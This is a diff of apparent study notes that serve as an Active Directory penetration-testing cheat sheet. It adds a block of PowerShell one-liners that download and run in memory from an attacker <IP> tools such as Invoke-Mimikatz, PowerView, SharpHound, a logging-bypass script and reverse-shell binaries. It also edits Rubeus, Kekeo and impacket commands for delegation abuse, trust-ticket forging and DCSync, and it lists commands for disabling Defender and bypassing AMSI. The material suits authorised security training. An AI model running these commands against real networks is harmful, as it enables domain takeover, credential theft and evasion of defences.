@@ -195,7 +195,6 @@ Import a `.psd1` script (get all the commands from a module with `Get-Command -m
     3. `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
 - Disable defender: `Set-MpPreference -DisableRealtimeMonitoring $true`
 
-
 **Steps to avoid signature based detection**
 1. Scan using AMSITrigger
 2. Modify the detected code snippet
@@ -255,6 +254,22 @@ Import a `.psd1` script (get all the commands from a module with `Get-Command -m
 - Not all the usernames found are always the ones that work. For example: you might find autologon creds `svc_loanmanager:Moneymakestheworldgoround!` which however lead to login with `evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'`
 - Every time that you think about Active Directory, think about a Forest, not a Domain. If one domain is compromised, so it is the entire forest. Whithin a forest, all the domains trust each others. This is why a forest is considered a security boundry.
 
+**Commands frequently used**
+```PowerShell
+iwr -uri http://<IP>/hfs.exe -o hfs.exe
+iwr -uri http://<IP>/nc64.exe -o nc64.exe
+iwr -uri http://<IP>/Rubeus.exe -o Rubeus.exe
+iwr -uri http://<IP>/BetterSafetyKatz.exe -Outfile BetterSafetyKatz.exe
+iwr -uri http://<IP>/kekeo.exe -Outfile kekeo.exe
+iwr -uri http://<IP>/reverse.exe -o reverse.exe
+iex((New-Object Net.WebClient).DownloadString('http://<IP>/PowerUp.ps1'))
+iex((New-Object Net.WebClient).DownloadString('http://<IP>/PowerView.ps1'))
+iex((New-Object Net.WebClient).DownloadString('http://<IP>/SharpHound.ps1'))
+iex((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-Mimikatz.ps1'))
+iex((New-Object Net.WebClient).DownloadString('http://<IP>/Find-PSRemotingLocalAdminAccess.ps1'))
+iex((New-Object Net.WebClient).DownloadString('http://<IP>/Find-WMILocalAdminAccess.ps1'))
+iex(iwr http://<IP>/sbloggingbypass.txt -UseBasicParsing)
+```
 
 ## Initial foothold
 - [ ] run `responder` + `mitm6`
@@ -291,7 +306,8 @@ Import a `.psd1` script (get all the commands from a module with `Get-Command -m
 - Access to the domain
   - [ ] Use [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell) to bypass the security controls in PowerShell
   - [ ] Run AMSI bypass
-  - [ ] See [#Notes](#notes) for Cheat sheets and detections bypasses if needed
+  - [ ] If necessary, run bypass .NET AMSI
+  - [ ] See [#Notes](#notes) for cheat sheets, detections bypasses and frequently used commands if needed
   - [ ] Enumerate with [PowerView](#powerview), [ADModule](#admodule), [BloodHound](#bloodhound)
   - [ ] [Active Directory Authentication Attacks](#active-directory-authentication-attacks)
   - [ ] Check: 
@@ -1097,7 +1113,7 @@ Resourced Based Constrained Delegation attack
 - Requirement: GenericAll on system
 1. `impacket-addcomputer <domain>/<username> -dc-ip <dc_ip> -hashes <ntlm_hashes> -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'`
 2. `python3 /path/to/rbcd.py -dc-ip <dc_ip> -t <target_dc> -f 'ATTACK' -hashes <ntlm_hashes> <domain>\\<username>`
-3. `impacket-getST -spn cifs/<target_dc_fqdn> <domain>/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip <dc_ip>`
+3. `impacket-getST -spn cifs/<DnsHostname> <domain>/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip <dc_ip>`
 4. `export KRB5CCNAME=./Administrator.ccache`
 5. `sudo echo '<target_dc_ip> <target_dc_fqdn>' >> /etc/hosts`
 6. `impacket-psexec -k -no-pass <target_dc_fqdn> -dc-ip <dc_ip>`
@@ -2005,7 +2021,7 @@ Using Kekeo
  
 Using Rubeus
 - Request a TGT and TGS in a single command
-  - `Rubeus.exe s4u /user:<user> /aes256:<aes256_hash> /impersonateuser:Administrator /msdsspn:CIFS/<target> /ptt`
+  - `Rubeus.exe s4u /user:<user> /aes256:<aes256_hash> /impersonateuser:Administrator /msdsspn:CIFS/<DnsHostname> /ptt`
   - `ls \\<target_hostname>\c$`
  
 -> Another issue with Kerberos is that delegation takes place not only for the designated service but also for any service operating under the same account. Moreover, there's no validation performed for the specified SPN.
@@ -2015,14 +2031,14 @@ Abusing with Kekeo
 - Request a TGT using asktgt
   - `tgt::ask /user:<target_user> /domain:<domain_name> /rc4:<rc4_hash>`
 - Using s4u (no SNAME validation):
-  - `tgs::s4u /tgt:<TGT_path> /user:Administrator@<domain> /service:cifs/<target>`
+  - `tgs::s4u /tgt:<TGT_path> /user:Administrator@<domain> /service:cifs/<DnsHostname>`
 - Using mimikatz
   - `Invoke-Mimikatz -Command '"kerberos::ptt <TGS_Ticket.kirbi>"'`
   - `Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<krbtgt_user>"'`
 
 Abusing with Rubeus
 - Request a TGT and TGS in a single command
-  - `.\Rubeus.exe s4u /user:<username> /rc4:<hash> /impersonateuser:Administrator /msdsspn:"CIFS/<target>" /ptt`
+  - `.\Rubeus.exe s4u /user:<username> /rc4:<hash> /impersonateuser:Administrator /msdsspn:"CIFS/<DnsHostname>" /altservice:ldap /ptt`
 
 After injection, we can DCSync:
 `C:\path\to\SafetyKatz.exe "lsadump::dcsync /user:<domain>\krbtgt" "exit"`
@@ -2054,7 +2070,7 @@ Process
 - Now, let's get the privileges of `<hostnamex>$` by extracting its AES keys
   - `Invoke-Mimikatz -Command '"sekurlsa::ekeys"'`
 - Use the AES key of `<hostnamex>$` with Rubeus and access `<target_computer>` as any user desired
-  - `Rubeus.exe s4u /user:<hostnamex>$ /aes256:<AES256_Key> /msdsspn:http/<target_SPN> /impersonateuser:<impersonated_user> /ptt`
+  - `Rubeus.exe s4u /user:<hostnamex>$ /aes256:<AES256_Key> /msdsspn:http/<DnsHostname> /impersonateuser:<impersonated_user> /ptt`
   - `winrs -r:<target_computer> cmd.exe`
 
 ### Child to Parent using Trust Tickets
@@ -2068,14 +2084,14 @@ Process
 
 Abuse with Kekeo
 - Get a TGS for a service in the target domain by using the forged trust ticket
-  - `.\asktgs.exe C:\path\to\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local`
+  - `.\asktgs.exe C:\path\to\trust_tkt.kirbi CIFS/<DnsHostname>`
 - Use the TGS to access the targeted service
-  - `.\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi`
+  - `.\kirbikator.exe lsa .\CIFS.<DnsHostname>.kirbi`
   - `ls \\mcorp-dc.moneycorp.local\c$`
 - You can also create tickets for others serivces (HOST and RPCSS for WMI, HTTP for PowerShell Remoting and WinRM)
 
 Abuse with Rubeus. Note that we are still using the TGT forged initially
-- `Rubeus.exe asktgs /ticket:<path_to_TGS_ticket.kirbi> /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt`
+- `Rubeus.exe asktgs /ticket:<path_to_TGS_ticket.kirbi> /service:cifs/<DnsHostname> /dc:mcorp-dc.moneycorp.local /ptt`
 - `ls \\mcorp-dc.moneycorp.local\c$`
 
 ### Child to Parent using krbtgt hash
@@ -2102,12 +2118,12 @@ Abuse with Rubeus. Note that we are still using the TGT forged initially
    - `C:\path\to\BetterSafetyKatz.exe "kerberos::golden /user:<target_user> /domain:<target_domain> /sid:<target_sid> /rc4:<ntlm_hash> /service:krbtgt /target:<target_domain> /ticket:<path_to_ticket>" "exit"`
 Abuse with Kekeo
 - Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket
-  - `.\asktgs.exe C:\path\to\trust_forest_tkt.kirbi CIFS/eurocorp-dc.corporate.local`
+  - `.\asktgs.exe C:\path\to\trust_forest_tkt.kirbi CIFS/<DnsHostname>`
 - Use the TGS to access the targeted service.
-  - `.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi`
+  - `.\kirbikator.exe lsa .\CIFS.<DnsHostname>.kirbi`
   - `ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\`
 Abuse with Rubeus
-- `Rubeus.exe asktgs /ticket:C:\path\to\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt`
+- `Rubeus.exe asktgs /ticket:C:\path\to\trust_forest_tkt.kirbi /service:cifs/<DnsHostname> /dc:eurocorp-dc.eurocorp.local /ptt`
 - `ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\`
 
 ### Across domain trusts - Active Directory Certificate Services (AD CS)
